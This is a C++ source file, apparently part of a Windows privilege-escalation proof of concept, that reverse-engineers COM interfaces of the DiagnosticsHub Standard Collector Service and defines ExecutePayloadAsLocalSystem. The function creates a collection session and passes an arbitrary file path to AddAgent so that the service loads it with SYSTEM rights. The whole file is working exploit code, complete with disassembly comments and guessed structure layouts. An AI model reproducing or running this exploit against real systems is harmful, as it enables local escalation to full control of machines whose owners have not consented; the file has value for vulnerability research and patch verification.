// PayloadExecution.cpp : Defines the functions for the static library.
//

#include <Windows.h>
#include "PayloadExecution.h"
#include "wil/resource.h"
#include <comdef.h>
#include <string>
#include <filesystem>

namespace fs = std::filesystem;

namespace
{
    GUID CLSID_CollectorService = { 0x42CBFAA7, 0xA4A7, 0x47BB,{ 0xB4, 0x22, 0xBD, 0x10, 0xE9, 0xD0, 0x27, 0x00, } };

    class __declspec(uuid("f23721ef-7205-4319-83a0-60078d3ca922")) ICollectionSession : public IUnknown
    {
    public:
        virtual HRESULT __stdcall PostStringToListener(REFGUID, LPWSTR) = 0;
        virtual HRESULT __stdcall PostBytesToListener() = 0;
        virtual HRESULT __stdcall AddAgent(LPWSTR path, REFGUID) = 0;
        //.rdata:0000000180035868                 dq offset ? Start@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJPEAUtagVARIANT@@@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::Start(tagVARIANT *)
        //.rdata:0000000180035870                 dq offset ? GetCurrentResult@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJFPEAUtagVARIANT@@@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::GetCurrentResult(short, tagVARIANT *)
        //.rdata:0000000180035878                 dq offset ? Pause@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJXZ; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::Pause(void)
        //.rdata:0000000180035880                 dq offset ? Resume@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJXZ; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::Resume(void)
        //.rdata:0000000180035888                 dq offset ? Stop@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJPEAUtagVARIANT@@@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::Stop(tagVARIANT *)
        //.rdata:0000000180035890                 dq offset ? TriggerEvent@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJW4SessionEvent@@PEAUtagVARIANT@@11@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::TriggerEvent(SessionEvent, tagVARIANT *, tagVARIANT *, tagVARIANT *)
        //.rdata:0000000180035898                 dq offset ? GetGraphDataUpdates@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJAEBU_GUID@@PEAUtagSAFEARRAY@@PEAUGraphDataUpdates@@@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::GetGraphDataUpdates(_GUID const &, tagSAFEARRAY *, GraphDataUpdates *)
        //.rdata:00000001800358A0                 dq offset ? QueryState@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJPEAW4SessionState@@@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::QueryState(SessionState *)
        //.rdata:00000001800358A8                 dq offset ? GetStatusChangeEventName@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJPEAPEAG@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::GetStatusChangeEventName(ushort * *)
        //.rdata:00000001800358B0                 dq offset ? GetLastError@EtwCollectionSession@StandardCollector@DiagnosticsHub@Microsoft@@UEAAJPEAJ@Z; Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSession::GetLastError(long *)
        //.rdata:00000001800358B8                 dq offset ? SetClientDelegate@EtwCollectionSession@StandardCollector@DiagnosticsHub@Mic
    };

    struct SessionConfiguration
    {
        DWORD version;      // Needs to be 1
        DWORD  a1;          // Unknown
        DWORD  something;   // Also unknown
        DWORD  monitor_pid;
        GUID   guid;
        BSTR   path;        // Path to a valid directory
        CHAR   trailing[256];
    };

    class __declspec(uuid("7e912832-d5e1-4105-8ce1-9aadd30a3809")) IStandardCollectorClientDelegate : public IUnknown
    {
    };

    class __declspec(uuid("0d8af6b7-efd5-4f6d-a834-314740ab8caa")) IStandardCollectorService : public IUnknown
    {
    public:
        virtual HRESULT __stdcall CreateSession(SessionConfiguration *, IStandardCollectorClientDelegate *, ICollectionSession **) = 0;
        virtual HRESULT __stdcall GetSession(REFGUID, ICollectionSession **) = 0;
        virtual HRESULT __stdcall DestroySession(REFGUID) = 0;
        virtual HRESULT __stdcall DestroySessionAsync(REFGUID) = 0;
        virtual HRESULT __stdcall AddLifetimeMonitorProcessIdForSession(REFGUID, int) = 0;
    };

    _COM_SMARTPTR_TYPEDEF(IStandardCollectorService, __uuidof(IStandardCollectorService));
    _COM_SMARTPTR_TYPEDEF(ICollectionSession, __uuidof(ICollectionSession));
}

void ExecutePayloadAsLocalSystem(const wchar_t *filePath)
{
    HRESULT hr = ::CoInitialize(NULL);
    if (FAILED(hr))
        throw std::runtime_error("CoInitialize failed. Error: " + std::to_string(hr));
    auto coUninitializeOnExit = wil::scope_exit([] { ::CoUninitialize(); });

    IStandardCollectorService *pStandardCollectorService;
    hr = ::CoCreateInstance(
        CLSID_CollectorService, nullptr, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&pStandardCollectorService));
    if (FAILED(hr))
        throw std::runtime_error("CoCreateInstance failed. Error: " + std::to_string(hr));

    DWORD authnSvc, authzSvc, authnLevel, impLevel, capabilities;
    LPOLESTR pServerPrincName;
    RPC_AUTH_IDENTITY_HANDLE identity;

    hr = ::CoQueryProxyBlanket(
        pStandardCollectorService, &authnSvc, &authzSvc, &pServerPrincName, &authnLevel, &impLevel, &identity, &capabilities);
    if (FAILED(hr))
        throw std::runtime_error("CoQueryProxyBlanket failed. Error: " + std::to_string(hr));

    hr = ::CoSetProxyBlanket(
        pStandardCollectorService, authnSvc, authzSvc, pServerPrincName, authnLevel, RPC_C_IMP_LEVEL_IMPERSONATE, identity, capabilities);
    if (FAILED(hr))
        throw std::runtime_error("CoSetProxyBlanket failed. Error: " + std::to_string(hr));

    SessionConfiguration sessionConfiguration = {};
    sessionConfiguration.version = 1;
    sessionConfiguration.monitor_pid = ::GetCurrentProcessId();

    sessionConfiguration.path = ::SysAllocString(fs::temp_directory_path().c_str());
    auto freePathOnExit = wil::scope_exit([path = sessionConfiguration.path]{ ::SysFreeString(path); });

    hr = ::CoCreateGuid(&sessionConfiguration.guid);
    if (FAILED(hr))
        throw std::runtime_error("CoCreateGuid failed. Error: " + std::to_string(hr));

    ICollectionSession *pCollectionSession;
    hr = pStandardCollectorService->CreateSession(&sessionConfiguration, nullptr, &pCollectionSession);
    if (FAILED(hr))
        throw std::runtime_error("ICollectionSession::CreateSession failed. Error: " + std::to_string(hr));
    auto destroySessionOnExit = wil::scope_exit([pStandardCollectorService, &sessionId = sessionConfiguration.guid]
        { static_cast<void>(pStandardCollectorService->DestroySession(sessionId)); });

    GUID agentGuid;
    hr = ::CoCreateGuid(&agentGuid);
    if (FAILED(hr))
        throw std::runtime_error("CoCreateGuid failed. Error: " + std::to_string(hr));

    hr = pCollectionSession->AddAgent(const_cast<LPWSTR>(filePath), agentGuid);
    if (FAILED(hr) && hr != 0x8007045a)
        throw std::runtime_error("ICollectionSession::AddAgent failed. Error: " + std::to_string(hr));
}
